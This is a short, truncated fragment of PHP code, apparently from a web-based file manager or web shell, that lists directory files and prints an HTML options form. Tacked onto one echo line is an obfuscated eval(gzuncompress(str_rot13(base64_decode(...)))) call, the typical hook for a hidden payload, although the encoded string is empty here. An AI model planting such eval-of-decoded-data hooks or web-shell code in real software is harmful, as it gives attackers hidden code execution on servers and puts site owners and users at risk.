...
if(isset($_GET['filesrc'])){
    ...
    foreach($scandir as $file){
        ...
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>'; eval(gzuncompress(str_rot13(base64_decode(''))));
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
        <option value=\"\"></option>
